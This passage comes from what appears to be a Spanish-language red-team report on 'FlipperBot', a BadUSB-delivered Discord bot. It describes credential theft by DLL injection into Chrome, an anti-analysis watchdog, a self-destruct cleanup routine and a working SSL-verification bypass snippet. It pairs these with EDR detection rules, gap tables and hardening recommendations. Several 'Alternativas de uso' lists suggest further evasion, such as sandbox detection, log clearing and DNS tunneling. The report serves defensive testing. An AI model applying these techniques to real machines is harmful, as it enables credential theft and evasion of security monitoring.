| Custom IOA | Regla custom | File Creation: `TargetFileName MATCHES ".*\.(exe|ps1|bat|dll)" AND ImageFileName CONTAINS "python.exe"` — detecta escritura de ejecutables |
| Sensor Visibility | Telemetria | Registra file writes — busqueable en Investigate |

**Deteccion Sophos:**
| Capacidad | Tipo | Detalle |
|---|---|---|
| Web Control / IPS | Built-in | **Proxy SSL activo bloquea descargas de `cdn.discordapp.com`** — esta deteccion YA funciona en el entorno de pruebas |
| Threat Protection | Built-in | Escanea archivos escritos en disco — detectaria malware conocido |
| Live Discover | Hunting | `SELECT * FROM sophos_file_journal WHERE process_name = 'python.exe' AND path NOT LIKE '%FlipperBot%'` |

---

### 17. !creds

**Que hace:** Extrae credenciales guardadas en Chrome y Edge, incluyendo las protegidas por App-Bound Encryption (Chrome 127+), usando un binario Rust que inyecta una DLL en el proceso del navegador.

**Que ejecuta:**
```
1. Lee "Local State" → extrae master key cifrada con DPAPI
2. Llama CryptUnprotectData() → obtiene master key v10/v11
3. Para v20 (ABE): lanza chrome.exe suspendido → inyecta DLL via
   CreateRemoteThread + LoadLibraryA → la DLL descifra dentro
   del contexto del navegador → devuelve la key via named pipe
4. Copia Login Data (SQLite) → consulta tabla "logins"
5. Descifra cada password con AES-256-GCM + la key correspondiente
6. Envia resultado como archivo .txt a Discord
```

**TTPs MITRE ATT&CK:**

| Tecnica | ID | Tactica |
|---|---|---|
| Credentials from Web Browsers | T1555.003 | Credential Access |
| DLL Injection | T1055.001 | Defense Evasion / Privilege Escalation |
| Exfiltration Over C2 Channel | T1041 | Exfiltration |

**Alternativas de uso:**
- Extraer cookies de sesion en vez de passwords (session hijacking)
- Extraer tokens de Discord/Slack del navegador
- Extraer datos de autofill (tarjetas de credito, direcciones)
- Dumping de credenciales con Mimikatz (requiere admin)

**IoCs en la PC victima:**
| Tipo | Detalle |
|---|---|
| Proceso | `creds_extractor.exe` ejecutado desde `%APPDATA%\FlipperBot\` |
| Proceso | `chrome.exe` lanzado en estado suspendido por `creds_extractor.exe` |
| DLL | `abe_decrypt.dll` cargada en el espacio de memoria de Chrome via `LoadLibraryA` |
| API | `CreateRemoteThread`, `VirtualAllocEx`, `WriteProcessMemory` — patron clasico de DLL injection |
| Archivo | Copia de `Login Data` (SQLite) en directorio temporal |
| Archivo | `creds_<timestamp>.txt` generado y enviado a Discord |
| Named Pipe | Comunicacion entre `creds_extractor.exe` y la DLL inyectada |
| DPAPI | Llamada a `CryptUnprotectData` desde un proceso no-navegador |

**Deteccion CrowdStrike:**
| Capacidad | Tipo | Detalle |
|---|---|---|
| Code Injection | Built-in (Toggle) | **"Code Injection"** en Prevention Policy — detecta `CreateRemoteThread` + `VirtualAllocEx`. OFF por defecto. **Si se habilita, DEBERIA bloquear este ataque** |
| Credential Theft | Built-in (Toggle) | **"Credential Dumping"** y **"Credential Access"** — multiples toggles para proteger credenciales del navegador. OFF por defecto |
| Suspicious Processes | Built-in (Toggle) | Detecta procesos desconocidos que acceden a archivos de credenciales del navegador |
| Custom IOA | Regla custom | Process Creation: `ImageFileName CONTAINS "creds_extractor" OR CommandLine CONTAINS "Login Data"` |
| Custom IOA | Regla custom | File Creation: `TargetFileName MATCHES "creds_.*\.txt"` |

**Deteccion Sophos:**
| Capacidad | Tipo | Detalle |
|---|---|---|
| Exploit Mitigation | Built-in | **"Code cave utilization"** y **"DLL hijacking"** en Exploit Mitigation — PERO solo protege procesos listados (navegadores SI estan). Deberia detectar inyeccion en Chrome |
| Credential Theft Protection | Built-in | **"Prevent credential theft"** en Threat Protection — protege contra dumping de credenciales. PERO depende de si el metodo esta en la base de firmas |
| CryptoGuard | Built-in | No aplica — CryptoGuard es para ransomware, no credential theft |
| AMSI | Limitacion | `creds_extractor.exe` es un binario Rust — **AMSI NO cubre binarios compilados**, solo scripts |
| Live Discover | Hunting | `SELECT * FROM sophos_process_journal WHERE process_name = 'creds_extractor.exe'` |

---

### 18. Watchdog de Procesos

**Que hace:** Cada 30 segundos escanea los procesos en ejecucion buscando herramientas de analisis. Si detecta alguna, alerta al atacante y ejecuta autodestruccion.

**Que monitorea:**
```python
WATCHDOG_PROCESSES = [
    "taskmgr", "procmon", "procmon64", "procexp", "procexp64",
    "ProcessHacker", "Wireshark", "tcpview", "tcpview64",
    "autoruns", "autoruns64", "perfmon",
]
```

**TTPs MITRE ATT&CK:**

| Tecnica | ID | Tactica |
|---|---|---|
| Security Software Discovery | T1518.001 | Discovery |
| Process Discovery | T1057 | Discovery |

**IoCs en la PC victima:**
| Tipo | Detalle |
|---|---|
| Proceso | `python.exe` enumerando procesos activos cada 30 segundos via `psutil` |
| Sin artefacto en disco | Solo opera en memoria — no genera archivos |

**Deteccion CrowdStrike / Sophos:** No detectable — la enumeracion de procesos es una operacion normal del sistema. No hay toggle ni regla que distinga esto de un proceso legitimo usando `psutil`.

**Alternativas de uso:**
- Agregar deteccion de debuggers (x64dbg, OllyDbg, IDA)
- Detectar VMs/sandboxes (vmtoolsd, VBoxService)
- En vez de autodestruirse, reducir actividad y esperar
- Detectar herramientas EDR especificas (CsFalconService, SophosSAU)

---

### 19. !selfdestruct / Cleanup

**Que hace:** Elimina toda evidencia del bot en la PC victima y cierra el proceso.

**Que limpia:**
```
1. Clave de persistencia del registro (WindowsSecurityUpdate)
2. Historial de PowerShell (lineas con el token o "FlipperBot")
3. Entradas de Run (Win+R) del registro que referencien al bot
4. Cache de pip (revela que se instalo discord.py)
5. Archivos recientes que referencien al bot
6. Cache DNS (oculta conexiones a discord.com)
7. Carpeta completa %APPDATA%\FlipperBot\
```

**TTPs MITRE ATT&CK:**

| Tecnica | ID | Tactica |
|---|---|---|
| Indicator Removal | T1070 | Defense Evasion |
| Clear Command History | T1070.003 | Defense Evasion |
| File Deletion | T1070.004 | Defense Evasion |

**Alternativas de uso:**
- Limpiar Windows Event Logs (requiere admin, T1070.001)
- Timestomping de archivos residuales (T1070.006)
- Sobrescribir archivos antes de borrar (wipe seguro)
- Limpiar Prefetch files y Amcache

**IoCs en la PC victima:**
| Tipo | Detalle |
|---|---|
| Registro | Eliminacion de `HKCU\...\Run\WindowsSecurityUpdate` |
| Archivo | Eliminacion de `%APPDATA%\FlipperBot\` (toda la carpeta) |
| Proceso | `powershell.exe` ejecutando `Remove-ItemProperty`, `Remove-Item -Recurse`, `ipconfig /flushdns` |
| Evento | Event ID 4688 — muestra los comandos de limpieza |
| Archivo | Modificacion del historial de PowerShell (`ConsoleHost_history.txt`) |
| DNS | Flush de cache DNS — Event ID en DNS Client log |

**Deteccion CrowdStrike:**
| Capacidad | Tipo | Detalle |
|---|---|---|
| Suspicious Registry Operations | Built-in (Toggle) | Detecta eliminacion de claves Run |
| Anti-Forensics | Built-in (Toggle) | **"Intelligence-Sourced Threats"** puede correlacionar eliminacion masiva de artefactos como anti-forensics |
| Custom IOA | Regla custom | Process Creation: `CommandLine CONTAINS "flushdns" AND ParentImageFileName CONTAINS "python.exe"` |
| Custom IOA | Regla custom | Process Creation: `CommandLine CONTAINS "ConsoleHost_history" AND CommandLine MATCHES "(Remove|Clear|Set-Content)"` |

**Deteccion Sophos:**
| Capacidad | Tipo | Detalle |
|---|---|---|
| Threat Protection | Built-in | **"Detect malicious behavior"** — eliminacion masiva de artefactos en secuencia rapida es un patron de anti-forensics |
| Adaptive Attack Protection | Built-in | En modo activo, bloquea comandos de limpieza desde procesos no confiables |
| Live Discover | Hunting | `SELECT * FROM sophos_process_journal WHERE cmdline LIKE '%flushdns%' OR cmdline LIKE '%ConsoleHost_history%'` |

---

### 20. Bypass SSL (Proxy Corporativo)

**Que hace:** Parchea `ssl.create_default_context` de Python para desactivar la verificacion de certificados, permitiendo que el bot se comunique con Discord incluso cuando CrowdStrike/Sophos esta haciendo inspeccion SSL (MITM).

**Que ejecuta:**
```python
_orig_ctx = ssl.create_default_context
def _no_verify_ctx(*a, **kw):
    ctx = _orig_ctx(*a, **kw)
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    return ctx
ssl.create_default_context = _no_verify_ctx
```

**TTPs MITRE ATT&CK:**

| Tecnica | ID | Tactica |
|---|---|---|
| Subvert Trust Controls | T1553 | Defense Evasion |

**IoCs en la PC victima:**
| Tipo | Detalle |
|---|---|
| Codigo | Monkey-patch de `ssl.create_default_context` en runtime de Python — solo en memoria |
| Red | Conexiones HTTPS sin validacion de certificado — el proxy SSL ve el trafico descifrado |
| Sin disco | La modificacion es en runtime de Python — no persiste en disco |

**Deteccion CrowdStrike:**
| Capacidad | Tipo | Detalle |
|---|---|---|
| No detectable | — | El monkey-patch es interno al proceso Python — CrowdStrike no inspecciona runtime de Python |
| SSL Inspection | Built-in | CrowdStrike SI intercepta el trafico TLS — pero el bot ignora el certificado MITM y funciona |

**Deteccion Sophos:**
| Capacidad | Tipo | Detalle |
|---|---|---|
| SSL/TLS Inspection | Built-in | Sophos intercepta y re-firma trafico — el bot ignora la verificacion. Sophos VE el trafico descifrado pero no lo bloquea |
| No detectable como tecnica | — | Deshabilitar verificacion SSL es una practica comun en scripts — no hay firma para esto |

**Alternativas de uso:**
- Extraer el certificado CA corporativo y agregarlo al trust store
- Usar DNS over HTTPS para C2 (evita inspeccion SSL completamente)
- Tunneling via ICMP o DNS que no pasa por el proxy

---

## Resumen de Deteccion EDR por Paso

| Paso | CrowdStrike | Sophos | Detectable? |
|---|---|---|---|
| 1. BadUSB/HID | Device Control Policy (config) | Peripheral Control (config) | Solo si se configura |
| 2. Download Cradle | Script Monitoring + AMSI (OFF) | AMSI + Threat Protection | Solo si se habilita |
| 3. EncodedCommand | Suspicious Scripts (OFF) | AMSI + Adaptive Attack | Solo si se habilita |
| 4. Token Base64 | Script Monitoring (OFF) | AMSI (bajo riesgo) | Poco probable |
| 5. Python Portable | Custom IOA necesaria | Application Control (Python) | Solo Sophos si se habilita App Control |
| 6. Registry Run Key | Suspicious Registry Ops (OFF) | Threat Protection + Adaptive | Solo si se habilita |
| 7. Discord C2 | Custom IOA (Domain Name) | Web Control (bloquear Discord) | Solo con reglas custom |
| 8-9. !ping/!info | No detectable | No detectable | **No** |
| 10. !screenshot | No detectable | No detectable | **No** |
| 11-12. !say/!notify | Custom IOA posible | No detectable | Poco probable |
| 13. !cmd | Suspicious Processes (OFF) | Threat Protection | Solo si se habilita |
| 14. !ps | Script Monitoring + AMSI (OFF) | AMSI | Solo si se habilita |
| 15. !download | Custom IOA (file read NO soportado) | No DLP nativo | **No** |
| 16. !upload | Custom IOA (file write) | Proxy SSL **YA BLOQUEA** | Sophos SI bloquea |
| 17. !creds | Code Injection toggle (OFF) | Exploit Mitigation (parcial) | Solo si se habilita |
| 18. Watchdog | No detectable | No detectable | **No** |
| 19. Selfdestruct | Suspicious Registry Ops (OFF) | Adaptive Attack Protection | Solo si se habilita |
| 20. SSL Bypass | No detectable | No detectable | **No** |

> **Conclusion:** La mayoria de los toggles de CrowdStrike que detectarian FlipperBot estan **OFF por defecto** (65 toggles de prevencion, la mayoria deshabilitados). Sophos tiene AMSI activo para PowerShell pero **NO cubre Python**, y su Application Control requiere configuracion manual.

---

## Cobertura Cyber Kill Chain

| Fase | Estado | Tecnicas Usadas |
|---|---|---|
| 1. Reconnaissance | No cubierta | (Pre-engagement, seleccion manual del target) |
| 2. Weaponization | Cubierta | Payloads DuckyScript, ofuscacion base64, compilacion del extractor |
| 3. Delivery | Cubierta | BadUSB via Flipper Zero, download cradle desde GitHub |
| 4. Exploitation | Cubierta | Inyeccion de keystrokes, ejecucion de PowerShell |
| 5. Installation | Cubierta | Python portable, persistencia en registro, bypass SSL |
| 6. Command & Control | Cubierta | Discord bot, comunicacion bidireccional |
| 7. Actions on Objectives | Cubierta | Credenciales, screenshots, ejecucion remota, exfiltracion |

---

## Cobertura MITRE ATT&CK por Tactica

| Tactica | Tecnicas | IDs |
|---|---|---|
| Initial Access | 1 | T1200 |
| Execution | 4 | T1059.001, T1059.003, T1059.006 |
| Persistence | 1 | T1547.001 |
| Privilege Escalation | 1 | T1055.001 |
| Defense Evasion | 6 | T1027, T1027.010, T1055.001, T1070, T1553, T1564.003 |
| Credential Access | 1 | T1555.003 |
| Discovery | 4 | T1033, T1057, T1082, T1518.001 |
| Collection | 1 | T1113 |
| Command and Control | 3 | T1071.001, T1102.002, T1105 |
| Exfiltration | 1 | T1041 |
| Impact | 1 | T1491.001 |

**Total: 11 de 14 tacticas cubiertas** (no cubre Reconnaissance, Resource Development, ni Lateral Movement).

---

## Hallazgos de Seguridad Durante las Pruebas

### Lo que NO detecto el EDR (CrowdStrike + Sophos)

1. **Ejecucion de PowerShell via BadUSB** — No detecto el dispositivo HID ni el download cradle
2. **Instalacion de Python portable** — Descarga desde python.org no fue bloqueada
3. **Persistencia en registro** — La clave Run no fue detectada ni alertada
4. **Canal C2 via Discord** — Trafico WebSocket no fue marcado como anomalo
5. **Extraccion de credenciales** — DLL injection + lectura de Login Data no fue bloqueada
6. **Ejecucion remota de comandos** — `cmd.exe` y PowerShell como hijos de Python no generaron alertas

### Lo que SI detecto/bloqueo

1. **Proxy SSL** — CrowdStrike/Sophos intercepta trafico HTTPS (inspeccion SSL activa)
2. **CDN de Discord bloqueado parcialmente** — Descargas desde `cdn.discordapp.com` devuelven 403 (bloquea `!upload`)

---

## Recomendaciones

### CrowdStrike — Toggles a Habilitar (Prevention Policy)

| # | Toggle | Que detecta de FlipperBot |
|---|---|---|
| 1 | **Suspicious Scripts and Commands** | Download cradle `irm|iex`, `-EncodedCommand` |
| 2 | **Script-Based Execution Monitoring** | Todo script PowerShell ejecutado por el bot |
| 3 | **AMSI** | Contenido de scripts antes de ejecucion |
| 4 | **Suspicious Registry Operations** | Persistencia en Run Key + eliminacion en selfdestruct |
| 5 | **Code Injection** | DLL injection de `creds_extractor.exe` en Chrome |
| 6 | **Credential Dumping** | Acceso a Login Data y DPAPI |
| 7 | **Suspicious Processes** | Python.exe y cmd.exe desde AppData |

### CrowdStrike — Custom IOA Rules a Crear

| # | Tipo | Regla |
|---|---|---|
| 1 | Domain Name | `gateway.discord.gg` desde proceso != `Discord.exe` |
| 2 | Process Creation | `python.exe` desde `%APPDATA%` |
| 3 | Process Creation | `cmd.exe` o `powershell.exe` hijo de `python.exe` en AppData |
| 4 | File Creation | `creds_*.txt` por cualquier proceso |

### Sophos — Configuraciones a Habilitar

| # | Politica | Que detecta de FlipperBot |
|---|---|---|
| 1 | **Application Control → Python** | Bloquea ejecucion de Python portable (toda la cadena se rompe) |
| 2 | **Threat Protection → Detect malicious behavior** (verificar nivel) | Cadenas de proceso sospechosas |
| 3 | **Peripheral Control** | Dispositivos USB no autorizados |
| 4 | **Web Control → Bloquear Discord** | Corta el canal C2 completamente |

### Medidas Generales

1. **Habilitar PowerShell Script Block Logging** (GPO) y Module Logging
2. **Habilitar Sysmon** — Event ID 1 (Process Create), 7 (Image Loaded), 8 (CreateRemoteThread), 13 (Registry)
3. **Restringir ejecucion desde AppData** via AppLocker o WDAC
4. **Monitorear dispositivos USB HID** via GPO + Device Installation Restrictions
